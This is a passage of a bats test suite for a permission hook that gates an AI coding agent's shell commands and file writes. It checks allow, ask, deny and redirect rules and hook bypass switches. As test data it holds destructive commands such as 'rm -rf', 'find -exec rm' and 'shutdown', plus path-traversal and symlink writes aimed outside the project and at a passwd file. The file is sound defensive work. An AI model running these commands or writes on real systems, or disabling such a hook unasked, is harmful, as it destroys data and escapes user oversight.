    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"deny"'* ]]
    [[ "$output" == *"ws exec"* ]]
}

@test "redirect: ws gh repo sync denies toward ws pull / ws exec" {
    seed_real_project_config

    run_hook 'ws gh repo sync'

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"deny"'* ]]
    [[ "$output" == *"ws pull"* ]]
}

@test "redirect: the recommended ws exec form does not match its own redirect" {
    seed_real_project_config

    run_hook 'ws exec terasology gh pr checkout 5334'

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
    [[ "$output" != *"workspace ROOT"* ]]
}

@test "redirect: fetching review comments points at ws review" {
    # The reflex `ws gh` made easy: pulling CR details through the provider CLI,
    # which returns comments with no thread ids and no resolved state — so the
    # triage is worse AND a later `ws review reply` has nothing to resolve.
    seed_real_project_config

    run_hook 'ws gh pr view 3 --comments'
    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"deny"'* ]]
    [[ "$output" == *"ws review"* ]]

    run_hook 'ws gh api repos/SiliconSaga/gdd-sandbox/pulls/3/comments'
    [[ "$output" == *'"permissionDecision":"deny"'* ]]
    [[ "$output" == *"ws review"* ]]
}

@test "hook-rules: no redirect pattern starts with a wildcard" {
    # A leading `*` reads as "this text anywhere in the command", which matches
    # arguments and quoted data as readily as the verb — so a rule meant to catch
    # `gh api …/comments` also denied a shell loop mentioning that endpoint, and a
    # `ws review reply` whose message discussed the rule. Covering the wrapped and
    # raw spellings takes two anchored rows instead (see the -raw twins); the
    # saving of one row is not worth a matcher that cannot tell a command from a
    # string. Guarded here because the failure is silent and easy to reintroduce.
    run grep -c '^[a-z0-9-]* *| *\*' "$REPO_ROOT/.claude/hooks/hook-rules"
    [ "$output" = "0" ]
}

@test "redirect: an endpoint quoted as data does not trigger the review redirect" {
    # The rules were originally written with a leading `*` so one row could cover
    # both the wrapped and raw spellings — which also made them match the endpoint
    # ANYWHERE in a command, including inside quoted arguments. Measured twice: a
    # shell loop carrying the endpoint in a string literal was denied, and so was a
    # `ws review reply` whose message text discussed the rule. A redirect that
    # blocks the wrapper it points at has overshot.
    seed_real_project_config

    run_hook 'ws review yggdrasil reply 156 THREADID "see repos/o/r/pulls/3/comments for context"'
    [ "$status" -eq 0 ]
    [[ "$output" != *"\"permissionDecision\":\"deny\""* ]]

    run_hook 'echo repos/o/r/pulls/3/reviews'
    [[ "$output" != *"ws review"* ]]
}

@test "redirect: the raw spelling is still caught after anchoring" {
    # Anchoring means each rule needs a -raw twin, matching the gh-checkout and
    # gh-repo-sync pairs. Without the twin, dropping the leading `*` would have
    # quietly stopped catching the un-wrapped form.
    seed_real_project_config

    run_hook 'gh api repos/o/r/pulls/3/comments'
    [[ "$output" == *'"permissionDecision":"deny"'* ]]
    [[ "$output" == *"ws review"* ]]

    run_hook 'gh pr view 3 --comments'
    [[ "$output" == *'"permissionDecision":"deny"'* ]]
    [[ "$output" == *"ws review"* ]]

}

@test "redirect: glab mr note is deliberately left reachable" {
    # Withdrawn rather than narrowed: glab spells thread replies and top-level
    # note creation the same way. `ws review reply` covers the first; nothing in
    # `ws review` can post a top-level note at all, only read them. A glob cannot
    # separate the two, so redirecting denied a capability with no alternative.
    seed_real_project_config

    run_hook 'glab mr note 3 --message x'
    [ "$status" -eq 0 ]
    [[ "$output" != *"ws review"* ]]
}

@test "redirect: what ws review cannot do stays reachable" {
    # Denying with no alternative is worse than the reflex it prevents. Checks,
    # diffs and unrelated API endpoints have no ws review equivalent today, so
    # they must not be caught by the review redirects.
    seed_real_project_config

    run_hook 'ws gh pr checks 3'
    [[ "$output" != *"ws review"* ]]
    run_hook 'ws gh pr diff 3'
    [[ "$output" != *"ws review"* ]]
    run_hook 'ws gh api repos/SiliconSaga/ken-site/actions/runs'
    [[ "$output" != *"ws review"* ]]
}

@test "allow-path: non-mutating ws gh subcommands are untouched by the guard" {
    seed_real_project_config

    run_hook 'ws gh pr view 5338 --repo MovingBlocks/Terasology'

    [ "$status" -eq 0 ]
    [[ "$output" != *'"permissionDecision":"deny"'* ]]
}

# ─── Tier 6: [allow-extras] from hook-rules.local ───────────────────

@test "allow via allow-extras: pattern from hook-rules.local [allow-extras] matches" {
    write_project_hook_rules ""
    write_local_hook_rules "[allow-extras]
figlet *"
    run_hook "figlet hello"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}

@test "allow via allow-extras: hook-rules.local walks up from a nested cwd" {
    # Put hook-rules.local at the project root, run with cwd nested inside.
    write_project_hook_rules ""
    write_local_hook_rules "[allow-extras]
figlet *"
    mkdir -p "$WORK/subdir/deeper"
    run_hook "figlet hello" "$WORK/subdir/deeper"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}

@test "allow via allow-extras: an [audit-acknowledged] section does not disable the rest of the file" {
    # Regression: [audit-acknowledged] belongs to ws audit-permissions, which
    # shares hook-rules.local with this hook. The parser treated it as an
    # unknown section and abandoned the file, so every [allow-extras] pattern
    # declared after it silently stopped applying — while hook-rules.local.example
    # documents exactly this layout, so anyone following the docs hit it.
    write_project_hook_rules ""
    write_local_hook_rules "[audit-acknowledged]
Bash(bash -n:*)

[allow-extras]
figlet *"
    run_hook "figlet hello"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}

@test "allow via allow-extras: a genuinely unknown section still abandons the file" {
    # The fail-safe itself must survive: a typo'd or unrecognized section is
    # still treated as a file-level error rather than silently ignored.
    write_project_hook_rules ""
    write_local_hook_rules "[not-a-real-section]
whatever

[allow-extras]
figlet *"
    run_hook "figlet hello"
    [ "$status" -eq 0 ]
    [[ "$output" != *"\"permissionDecision\":\"allow\""* ]]
}

# ─── Malformed settings.json doesn't crash the hook ────────────────

@test "malformed settings.json: hook continues to passthrough (no script crash)" {
    # Regression: the script runs under `set -euo pipefail`. Before the
    # `jq empty` parse-check guard, a corrupted .claude/settings.json
    # would make jq exit non-zero, abort the script mid-walk, and the
    # harness would see a hook crash on every Bash call. Now the file
    # is skipped on parse failure; the hook keeps walking.
    printf '%s\n' '{ this is not valid json' > "$WORK/.claude/settings.json"
    run_hook "npm install some-package"
    [ "$status" -eq 0 ]
    # Passthrough — no allow/deny decision should be emitted.
    [[ "$output" != *"permissionDecision"* ]]
}

# ─── Audit-log injection safety ─────────────────────────────────────

@test "audit log: command with embedded newline does NOT split entry across lines" {
    # Regression: without the audit_safe newline-escape, a command
    # containing $'\n' would split a single audit entry across
    # multiple lines, breaking the one-entry-per-line shape that
    # `tail -100`, grep, and the housekeeping skill assume.
    #
    # Test the safety property (single-line integrity + content
    # preserved), not the exact escape sequence — the latter is an
    # implementation detail that bash pattern-matching makes
    # awkward to assert anyway (a `\` inside `[[ ... == *pat* ]]`
    # is treated as a glob escape and silently consumed).
    run_hook $'ls\npwd'
    [ "$status" -eq 0 ]
    log="$HOME/.claude/hook-audit.log"
    [ -f "$log" ]
    # Exactly one log line. Without escape this would be 2 (the
    # embedded newline would start a new awk record mid-entry).
    line_count="$(awk 'END{print NR}' "$log")"
    [ "$line_count" = "1" ]
    # Both halves of the original command appear in the single
    # entry — the escape doesn't drop content, just flattens the
    # separator.
    log_content="$(cat "$log")"
    [[ "$log_content" == *ls* ]]
    [[ "$log_content" == *pwd* ]]
}

# ─── Edit/Write scratch-dir branch ──────────────────────────────────

@test "Edit/Write: write into a scratch dir auto-allows" {
    write_project_hook_rules "[scratch-dirs]
.tmp/
.commits/
.crs/
.issues/
.outputs/"
    run_hook_write "Write" ".tmp/draft.md"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}

@test "Edit/Write: write outside scratch dirs passes through" {
    write_project_hook_rules "[scratch-dirs]
.tmp/
.commits/
.crs/
.issues/
.outputs/"
    run_hook_write "Write" "src/main.rs"
    [ "$status" -eq 0 ]
    # No scratch-dir match → passthrough, harness prompts.
    [[ "$output" != *"permissionDecision"* ]]
}

@test "Edit/Write: path traversal out of a scratch dir does NOT auto-allow" {
    # Regression: the scratch-dir test is a textual prefix match, so
    # `.tmp/../../escape` still STARTS WITH `<project>/.tmp/` and
    # would wrongly auto-allow a write that RESOLVES outside the
    # project. The `..`-segment guard rejects it to passthrough.
    write_project_hook_rules "[scratch-dirs]
.tmp/
.commits/
.crs/
.issues/
.outputs/"
    run_hook_write "Write" ".tmp/../../escape.txt"
    [ "$status" -eq 0 ]
    [[ "$output" != *"permissionDecision"* ]]
}

@test "Edit/Write: a bare .. component does not auto-allow" {
    write_project_hook_rules "[scratch-dirs]
.tmp/
.commits/
.crs/
.issues/
.outputs/"
    run_hook_write "Edit" "../outside.txt"
    [ "$status" -eq 0 ]
    [[ "$output" != *"permissionDecision"* ]]
}

@test "Edit/Write: a symlink dir escaping a scratch dir does not auto-allow" {
    # `.tmp/evil` is a symlink to a dir OUTSIDE the project. A write
    # to `.tmp/evil/passwd` has a literal path under `.tmp/`, but its
    # physical resolution lands outside — the symlink guard catches it.
    #
    # Verify the link with `-L`, not `ln -s`'s exit code: Git Bash on
    # Windows returns 0 from `ln -s` but silently creates a real copy
    # when symlink privileges are absent. Skip cleanly in that case.
    write_project_hook_rules "[scratch-dirs]
.tmp/
.commits/
.crs/
.issues/
.outputs/"
    mkdir -p "$WORK/.tmp"
    mkdir -p "$BATS_TEST_TMPDIR/outside"
    ln -s "$BATS_TEST_TMPDIR/outside" "$WORK/.tmp/evil" 2>/dev/null || true
    [[ -L "$WORK/.tmp/evil" ]] || skip "real symlinks not supported on this platform"
    run_hook_write "Write" ".tmp/evil/passwd"
    [ "$status" -eq 0 ]
    [[ "$output" != *"permissionDecision"* ]]
}

@test "Edit/Write: a symlinked target file in a scratch dir does not auto-allow" {
    # The target itself is a symlink — a write follows it wherever it
    # points. The `-L` check rejects it before the prefix match.
    write_project_hook_rules "[scratch-dirs]
.tmp/
.commits/
.crs/
.issues/
.outputs/"
    mkdir -p "$WORK/.tmp"
    ln -s "$BATS_TEST_TMPDIR/secret.txt" "$WORK/.tmp/sneaky.txt" 2>/dev/null || true
    [[ -L "$WORK/.tmp/sneaky.txt" ]] || skip "real symlinks not supported on this platform"
    run_hook_write "Write" ".tmp/sneaky.txt"
    [ "$status" -eq 0 ]
    [[ "$output" != *"permissionDecision"* ]]
}

@test "scratch: a config-only scratch dir auto-allows Edit" {
    write_project_hook_rules "[scratch-dirs]
.myscratch/"
    run_hook_write "Edit" ".myscratch/note.md"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}

@test "scratch: a dir NOT in config does not auto-allow" {
    write_project_hook_rules "[scratch-dirs]
.tmp/"
    run_hook_write "Edit" ".notscratch/note.md"
    [ "$status" -eq 0 ]
    [[ "$output" != *"\"permissionDecision\":\"allow\""* ]]
}

# ─── Passthrough ────────────────────────────────────────────────────

@test "passthrough: unmatched command yields no decision" {
    run_hook "npm install some-package"
    [ "$status" -eq 0 ]
    # No JSON output → harness's normal flow takes over
    [[ "$output" != *"permissionDecision"* ]]
}

# ─── WS_HOOK_DISABLE bypass ─────────────────────────────────────────

@test "WS_HOOK_DISABLE: skips all checks, including Tier 1 deny" {
    # Even a compound command should pass through when the env var
    # is set. The bypass is the user's escape hatch for sessions
    # where they don't want the hook active at all.
    WS_HOOK_DISABLE=1 run_hook "ls && pwd"
    [ "$status" -eq 0 ]
    [[ "$output" != *"permissionDecision"* ]]
}

@test "WS_HOOK_DISABLE=0 does NOT bypass (treats as opt-in, not boolean)" {
    # An earlier version used a non-empty check that meant
    # WS_HOOK_DISABLE=0 also disabled the hook — the opposite of
    # every other env-var-flag convention and a foot-gun for users
    # exporting WS_HOOK_DISABLE=0 thinking they're explicitly
    # turning it off. The fix is an explicit `== "1"` comparison.
    WS_HOOK_DISABLE=0 run_hook "ls && pwd"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
}

@test "WS_HOOK_DISABLE='' does NOT bypass" {
    # Empty string from `export WS_HOOK_DISABLE=` should NOT bypass —
    # only an explicit `=1` opts out.
    WS_HOOK_DISABLE='' run_hook "ls && pwd"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
}

# ─── Timeout-safe upward walk ───────────────────────────────────────

@test "timeout safety: Windows-style cwd doesn't hang the upward walk" {
    # The original bug: dirname of "D:/foo/bar" eventually returns "."
    # and `dirname .` returns "." forever. The hook's prev-equals-dir
    # guard exits the loop. This test confirms the guard works: a
    # Windows-style cwd completes within the 10s timeout in run_hook.
    write_project_settings 'Bash(ws status)'
    run_hook "ws status" "D:/Dev/GitWS/yggdrasil"
    [ "$status" -eq 0 ]
    # Exit status 124 would mean timeout — anything else means the
    # walk terminated. The output may or may not be "allow" depending
    # on whether the Windows path actually exists as a project root.
    # The key assertion is that we DIDN'T hit the timeout.
    [ "$status" -ne 124 ]
}

# ─── Tier 4: ask-list ───────────────────────────────────────────────

@test "ask: rm -rf matches the baseline ask-list and emits ask" {
    write_project_hook_rules "[ask-commands]
rm -rf*"
    run_hook "rm -rf build/"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
}

@test "ask: rm-family ask reason carries the symlink caution" {
    write_project_hook_rules "[ask-commands]
rm -rf*"
    run_hook "rm -rf build/"
    [ "$status" -eq 0 ]
    [[ "$output" == *"symlinks"* ]]
}

@test "ask: non-rm ask reason has no symlink caution" {
    write_project_hook_rules "[ask-commands]
git reset --hard*"
    run_hook "git reset --hard HEAD~1"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
    [[ "$output" != *"symlinks"* ]]
}

@test "ask: ws exec matches the baseline ask-list and emits ask" {
    write_project_hook_rules "[ask-commands]
ws exec *"
    run_hook "ws exec yggdrasil git status"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
}

@test "ask: bash scripts/ws exec normalizes to the ws exec ask-list entry" {
    write_project_hook_rules "[ask-commands]
ws exec *"
    run_hook "bash scripts/ws exec yggdrasil git status"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
}

@test "ask: ws exec ask-list entry matches many command arguments" {
    write_project_hook_rules "[ask-commands]
ws exec *"
    run_hook "ws exec yggdrasil printf %s a b c d e f g h"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
}

@test "allow: bare ws exec --help is a help-only invocation, not an ask" {
    write_project_hook_rules "[ask-commands]
ws exec *"
    run_hook "ws exec --help"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}

@test "allow: wrapper-form ws exec -h help invocation skips the ask-list" {
    write_project_hook_rules "[ask-commands]
ws exec *"
    run_hook "bash scripts/ws exec -h"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}

@test "ask: --help passed through a wrapped ws exec command still asks" {
    write_project_hook_rules "[ask-commands]
ws exec *"
    run_hook "ws exec yggdrasil somecmd --help"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
}

@test "ask: bare ws mcp-setup is human-gated by the shipped policy" {
    seed_real_project_config
    run_hook "ws mcp-setup"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
}

@test "allow: ws mcp-setup dry-run stays automatic" {
    seed_real_project_config
    run_hook "ws mcp-setup --dry-run"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
    [[ "$output" != *"\"permissionDecision\":\"ask\""* ]]
}

@test "allow: ws mcp-status stays automatic" {
    seed_real_project_config
    run_hook "ws mcp-status"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}

@test "drift: bare mutating mcp-setup forms are absent from the allowlist" {
    run jq -e '
        (.permissions.allow | index("Bash(ws mcp-setup)") == null) and
        (.permissions.allow | index("Bash(bash scripts/ws mcp-setup)") == null)
    ' "$REPO_ROOT/.claude/settings.json"
    [ "$status" -eq 0 ]
}

@test "ask: ws hook-bypass gets a tailored message naming the slug + reason" {
    write_project_hook_rules "[ask-commands]
ws hook-bypass [a-z]*"
    run_hook 'ws hook-bypass git-commit --reason "amend last commit"'
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
    [[ "$output" == *"git-commit"* ]]
    [[ "$output" == *"amend last commit"* ]]
    # NOT the generic destructive-command message
    [[ "$output" != *"destructive or hard to undo"* ]]
}

@test "ask: ws hook-bypass without --reason surfaces (none)" {
    write_project_hook_rules "[ask-commands]
ws hook-bypass [a-z]*"
    run_hook "ws hook-bypass git-push"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
    [[ "$output" == *"git-push"* ]]
    [[ "$output" == *"(none)"* ]]
}

@test "ask: ws hook-bypass supports the --reason=<value> form" {
    write_project_hook_rules "[ask-commands]
ws hook-bypass [a-z]*"
    run_hook "ws hook-bypass git-commit --reason=amend-last-commit"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
    [[ "$output" == *"git-commit"* ]]
    [[ "$output" == *"amend-last-commit"* ]]
    [[ "$output" != *"destructive or hard to undo"* ]]
}

@test "ask: ws hook-bypass message names the raw command pattern, not just the slug" {
    write_project_hook_rules "$(cat <<'EOF'
[redirect-commands]
git-commit | git commit* | Use ws commit
[ask-commands]
ws hook-bypass [a-z]*
EOF
)"
    run_hook "ws hook-bypass git-commit"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
    # The slug is named AND the raw command pattern it maps to is surfaced,
    # so the human isn't told the slug 'git-commit' is itself the command.
    [[ "$output" == *"git-commit"* ]]
    [[ "$output" == *"git commit*"* ]]
}

@test "ask: Tier 1 composition denies before the ask-tier is reached" {
    write_project_hook_rules "[ask-commands]
rm -rf*"
    run_hook "rm -rf build/ && echo done"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" != *"\"permissionDecision\":\"ask\""* ]]
}

@test "ask: hook-rules.local ask-command is additive (also asks)" {
    write_project_hook_rules "[ask-commands]
rm -rf*"
    write_local_hook_rules "[ask-commands]
shutdown*"
    run_hook "shutdown now"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
}

@test "ask: a malformed hook-rules (entry before any section) degrades, no crash" {
    write_project_hook_rules "rm -rf*
[ask-commands]
rm -rf*"
    run_hook "ls"
    [ "$status" -eq 0 ]
    # Degraded: the malformed file is skipped, so no rules load and the
    # unrelated command gets no hook decision at all (passthrough).
    [[ "$output" != *"permissionDecision"* ]]
}

@test "ask: no hook-rules file present → no ask, passthrough still works" {
    run_hook "rm -rf build/"
    [ "$status" -eq 0 ]
    [[ "$output" != *"\"permissionDecision\":\"ask\""* ]]
}

# ─── Tier 6 vs legacy safe-bash-extras ──────────────────────────────

@test "allow-extras: a hook-rules.local [allow-extras] pattern allows" {
    write_project_hook_rules ""
    write_local_hook_rules "[allow-extras]
sl *"
    run_hook "sl -e"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}

@test "allow-extras: a legacy safe-bash-extras file is ignored" {
    write_project_extras "sl *"
    run_hook "sl -e"
    [ "$status" -eq 0 ]
    [[ "$output" != *"\"permissionDecision\":\"allow\""* ]]
}

@test "allow-extras: an [allow-extras] section in the committed hook-rules is ignored" {
    write_project_hook_rules "[allow-extras]
sl *"
    run_hook "sl -e"
    [ "$status" -eq 0 ]
    [[ "$output" != *"\"permissionDecision\":\"allow\""* ]]
}

@test "ask: git -C <path> reset --hard matches the broadened git ask-pattern" {
    write_project_hook_rules "[ask-commands]
git*reset --hard*"
    run_hook "git -C /some/repo reset --hard HEAD"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
}

# ─── ws review side-effect ask entries ──────────────────────────────
#
# With the review allowlist collapsed to Bash(ws review:*), the
# outward-facing forms (reply posts to the PR; --resolve mutates
# thread state) are kept human-gated via the ask-list, which runs
# BEFORE the settings-allow tier. Read-only review stays frictionless.

@test "ask: ws review reply forces a prompt despite the review:* allow" {
    write_project_settings 'Bash(ws review:*)'
    write_project_hook_rules "[ask-commands]
ws review * reply *"
    run_hook 'ws review yggdrasil reply 94 PRRT_x "done, thanks" --resolve'
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
}

@test "ask: verbose ws review reply normalizes then asks" {
    write_project_settings 'Bash(ws review:*)'
    write_project_hook_rules "[ask-commands]
ws review * reply *"
    run_hook 'bash scripts/ws review yggdrasil reply 94 PRRT_x msg --resolve'
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
}

@test "ask: ws review threads --resolve-all forces a prompt" {
    write_project_settings 'Bash(ws review:*)'
    write_project_hook_rules "[ask-commands]
ws review * threads * --resolve*"
    run_hook 'ws review yggdrasil threads 94 --resolve-all'
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
}

@test "ask: read-only ws review does NOT trip the side-effect ask entries" {
    write_project_settings 'Bash(ws review:*)'
    write_project_hook_rules "[ask-commands]
ws review * reply *
ws review * threads * --resolve*"
    run_hook 'ws review yggdrasil 94 --compact'
    [ "$status" -eq 0 ]
    [[ "$output" != *"\"permissionDecision\":\"ask\""* ]]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}

@test "ask: read-only threads --status does NOT trip the resolve ask entry" {
    write_project_settings 'Bash(ws review:*)'
    write_project_hook_rules "[ask-commands]
ws review * threads * --resolve*"
    run_hook 'ws review yggdrasil threads 94 --status'
    [ "$status" -eq 0 ]
    [[ "$output" != *"\"permissionDecision\":\"ask\""* ]]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}

# ─── Drift detection ────────────────────────────────────────────────

@test "drift: hook-rules [scratch-dirs] stays in sync with .gitignore" {
    # Scratch entries declared in .gitignore, between the sentinel
    # markers, with the leading '/' stripped, sorted.
    local gitignore_dirs
    gitignore_dirs=$(awk '/^# >>> scratch-dirs/{f=1; next} /^# <<< scratch-dirs/{f=0} f' \
        "$REPO_ROOT/.gitignore" | sed 's:^/::' | sort)

    # Scratch entries declared in hook-rules [scratch-dirs], comments
    # and blank lines dropped, sorted.
    local hookrules_dirs
    hookrules_dirs=$(awk '/^\[scratch-dirs\]/{f=1; next} /^\[/{f=0} f' \
        "$REPO_ROOT/.claude/hooks/hook-rules" \
        | grep -v '^[[:space:]]*#' | grep -v '^[[:space:]]*$' | sort)

    if [ -z "$gitignore_dirs" ]; then
        echo "drift test: extracted no scratch-dirs from .gitignore — sentinel markers missing or renamed?"
        return 1
    fi
    if [ -z "$hookrules_dirs" ]; then
        echo "drift test: extracted no entries from hook-rules [scratch-dirs] — section header missing or renamed?"
        return 1
    fi

    if [ "$gitignore_dirs" != "$hookrules_dirs" ]; then
        echo "scratch-dir drift between .gitignore and hook-rules:"
        echo "--- .gitignore ---"
        echo "$gitignore_dirs"
        echo "--- hook-rules [scratch-dirs] ---"
        echo "$hookrules_dirs"
        return 1
    fi
}

@test "drift: committed ask-list force-prompts ws exec" {
    local ask_entries
    ask_entries=$(awk '/^\[ask-commands\]/{f=1; next} /^\[/{f=0} f' \
        "$REPO_ROOT/.claude/hooks/hook-rules" \
        | grep -v '^[[:space:]]*#' | grep -v '^[[:space:]]*$')

    if ! grep -Fxq 'ws exec *' <<< "$ask_entries"; then
        echo "hook-rules [ask-commands] must include: ws exec *"
        echo "--- hook-rules [ask-commands] ---"
        echo "$ask_entries"
        return 1
    fi
}

@test "ask: find -exec matches the broadened find ask-pattern" {
    write_project_hook_rules "[ask-commands]
find*-exec*"
    run_hook "find . -type f -exec rm {} +"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
}

@test "ask: shipped find floor covers file-writing and interactive execution primaries" {
    seed_real_project_config
    local command
    local -a commands=(
        "find . -maxdepth 0 -fprintf $WORK/out %p"
        "find . -maxdepth 0 -fprint $WORK/out"
        "find . -maxdepth 0 -fprint0 $WORK/out"
        "find . -maxdepth 0 -fls $WORK/out"
        "find . -maxdepth 0 -ok echo {} +"
    )

    for command in "${commands[@]}"; do
        run_hook "$command"
        [ "$status" -eq 0 ]
        [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
    done
}

@test "allow: broad local find rule still permits read-only searches" {
    seed_real_project_config
    write_local_hook_rules "[allow-extras]
find *"

    run_hook "find . -type f -print"

    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}

# ─── Tier 2 redirect-deny — parser ──────────────────────────────────

@test "redirect: malformed [redirect-commands] entry (2 columns) is skipped with warning" {
    write_project_hook_rules "$(cat <<'EOF'
[redirect-commands]
malformed-entry | only-two-columns
git-commit | git commit* | Use ws commit
EOF
)"
    run_hook "git commit -m x"
    [ "$status" -eq 0 ]
    # Well-formed entry still fires
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"Use ws commit"* ]]
    # Malformed entry triggers a warning in the audit log
    grep -q "WARNING.*malformed \[redirect-commands\] entry" "$HOME/.claude/hook-audit.log"
}

@test "redirect: malformed slug (uppercase / underscore) is skipped" {
    write_project_hook_rules "$(cat <<'EOF'
[redirect-commands]
git_commit | git commit* | bad slug, should skip
git-commit | git commit* | Use ws commit
EOF
)"
    run_hook "git commit -m x"
    [ "$status" -eq 0 ]
    [[ "$output" == *"Use ws commit"* ]]
    [[ "$output" != *"bad slug"* ]]
}

# ─── Tier 2 redirect-deny — evaluation ──────────────────────────────

@test "redirect: git commit denies with ws commit suggestion" {
    write_project_hook_rules "$(cat <<'EOF'
[redirect-commands]
git-commit | git commit* | Use `ws commit <comp> <bodyfile>` — handles Co-Authored-By trailer + bodyfile-driven staging.
git-push | git push* | Use `ws push <comp> [branch]` — handles fork-remote selection.
gh-pr-create | gh pr create* | Use `ws cr <comp> <title> <bodyfile>` — bodyfile-driven.
EOF
)"
    run_hook 'git commit -m "fix bug"'
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"Use \`ws commit"* ]]
}

@test "redirect: git push denies with ws push suggestion" {
    write_project_hook_rules "$(cat <<'EOF'
[redirect-commands]
git-commit | git commit* | Use ws commit
git-push | git push* | Use ws push
gh-pr-create | gh pr create* | Use ws cr
EOF
)"
    run_hook "git push origin feature/x"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"Use ws push"* ]]
}

@test "redirect: gh pr create denies with ws cr suggestion" {
    write_project_hook_rules "$(cat <<'EOF'
[redirect-commands]
git-commit | git commit* | Use ws commit
git-push | git push* | Use ws push
gh-pr-create | gh pr create* | Use ws cr
EOF
)"
    run_hook "gh pr create --title x --body y"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"Use ws cr"* ]]
}

@test "redirect: composition wins over redirect (T1 before T2)" {
    write_project_hook_rules "$(cat <<'EOF'
[redirect-commands]
git-commit | git commit* | Use ws commit
EOF
)"
    run_hook 'git commit -m x && git push'
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"Shell composition"* ]]
    [[ "$output" != *"Use ws commit"* ]]
}

@test "redirect: git mv denies with plain-mv + bodyfile guidance" {
    write_project_hook_rules "$(cat <<'EOF'
[redirect-commands]
git-commit | git commit* | Use ws commit
git-mv | git mv* | Use plain mv then list both paths in the ws commit bodyfile
EOF
)"
    run_hook "git mv old.md new.md"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"list both paths"* ]]
}

@test "redirect: git-mv glob does not over-match 'mv' in other git args" {
    write_project_hook_rules "$(cat <<'EOF'
[redirect-commands]
git-commit | git commit* | Use ws commit
git-mv | git mv* | Use plain mv then list both paths in the ws commit bodyfile
EOF
)"
    # A non-mv subcommand whose args merely contain " mv " must NOT be denied
    # as git-mv (the bare `git mv*` pattern is start-anchored, not a catch-all).
    run_hook 'git tag -a v1 -m "drop the old mv helper"'
    [ "$status" -eq 0 ]
    [[ "$output" != *"list both paths"* ]]
}

@test "redirect: 'mv' in a commit message routes to git-commit, not git-mv" {
    write_project_hook_rules "$(cat <<'EOF'
[redirect-commands]
git-commit | git commit* | Use ws commit
git-mv | git mv* | Use plain mv then list both paths
EOF
)"
    run_hook 'git commit -m "remove old mv helper"'
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"Use ws commit"* ]]
    [[ "$output" != *"list both paths"* ]]
}

# ─── Tier 3 — adapter-aware test/lint redirects ─────────────────────

# When `[adapter-redirect-commands]` matches (pytest, ruff, etc.) and
# $cwd resolves to a component with a wired adapter, the hook denies
# with a bypass-pointer. When the adapter is unwired (file absent or
# missing the commands.<verb> entry), the hook emits a stderr nudge
# and falls through to the normal allow/ask evaluation. Outside a
# component dir, the rule doesn't fire at all.

@test "adapter-redirect: raw pytest in a component WITH commands.test denies" {
    write_project_hook_rules "$(cat <<'EOF'
[adapter-redirect-commands]
pytest      | pytest*            | test
pytest-mod  | python* -m pytest* | test
